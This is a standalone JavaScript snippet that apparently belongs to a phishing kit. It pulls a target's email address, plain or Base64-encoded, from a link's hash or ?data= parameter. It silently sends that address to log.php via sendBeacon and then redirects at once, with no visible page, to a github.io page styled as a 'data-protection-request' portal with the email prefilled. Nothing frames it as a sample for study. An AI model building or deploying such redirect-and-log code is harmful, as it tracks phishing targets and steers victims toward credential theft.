<script type="text/javascript">
function validateEmail(email) {
    var re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return re.test(email);
}

function decodeBase64(s) {
    var e = {}, i, b = 0, c, x, l = 0, a, r = '', w = String.fromCharCode, L = s.length;
    var A = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    for (i = 0; i < 64; i++) { e[A.charAt(i)] = i; }
    for (x = 0; x < L; x++) {
        c = e[s.charAt(x)];
        if (c === undefined) continue;
        b = (b << 6) + c;
        l += 6;
        while (l >= 8) {
            a = (b >>> (l -= 8)) & 0xff;
            if (a || x < (L - 2)) r += w(a);
        }
    }
    return r;
}

function logToConsole(message, data) {
    try {
        console.log("[Redirect Debug]", message, data || "");
    } catch(e) {}
}

function processRedirect() {
    try {
        // 1. Get encoded data from either #hash or ?data= parameter
        var hash = window.location.hash.substring(1);
        var dataParam = null;
        try {
            var params = new URLSearchParams(window.location.search);
            if (params.has('data')) {
                dataParam = decodeURIComponent(params.get('data'));
            }
        } catch(e) {}

        // Prefer hash over data parameter (if both exist)
        var rawInput = hash || dataParam;
        if (!rawInput) {
            logToConsole("No encoded data found (neither #hash nor ?data=)");
            return;
        }

        logToConsole("Original raw input:", rawInput);
        logToConsole("Source:", hash ? "hash" : "data parameter");

        var email = null;

        // 2. Check if the raw input is already a plain email (after $→@ replacement)
        var possibleEmail = rawInput.replace(/\$/g, '@');
        if (validateEmail(possibleEmail)) {
            email = possibleEmail;
            logToConsole("Input is plain email:", email);
        } else {
            // 3. Not a plain email → try Base64 decode (with double‑decode fallback)
            var decoded = decodeBase64(rawInput);
            logToConsole("Decoded once:", decoded);

            var candidate = decoded.replace(/\$/g, '@');
            if (validateEmail(candidate)) {
                email = candidate;
                logToConsole("Decoded Base64 → email:", email);
            } else {
                // Try double decode
                try {
                    var doubleDecoded = decodeBase64(decoded);
                    var candidate2 = doubleDecoded.replace(/\$/g, '@');
                    if (validateEmail(candidate2)) {
                        email = candidate2;
                        logToConsole("Double decoded → email:", email);
                    }
                } catch(e) {}
            }
        }

        // 4. Final validation (if email still null or invalid, stop)
        if (!email || !validateEmail(email)) {
            logToConsole("Invalid email, stopping:", email);
            return;
        }

        // 5. Re‑encode clean email as Base64
        var newHash = btoa(email);

        // 6. Silent logging
        try {
            navigator.sendBeacon(
                "log.php",
                JSON.stringify({ 
                    email: email,
                    original_raw: rawInput,
                    source: hash ? "hash" : "data",
                    timestamp: new Date().toISOString()
                })
            );
        } catch (e) {}

        // 7. Redirect
        var redirectUrl = "https://data-protection-request.github.io/protection-administration/#" + newHash;
        logToConsole("Redirecting to:", redirectUrl);

        window.location.replace(redirectUrl);

    } catch (error) {
        console.error("Redirect error:", error);
    }
}

// Run immediately (no delay, no UI)
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', processRedirect);
} else {
    processRedirect();
}
</script>
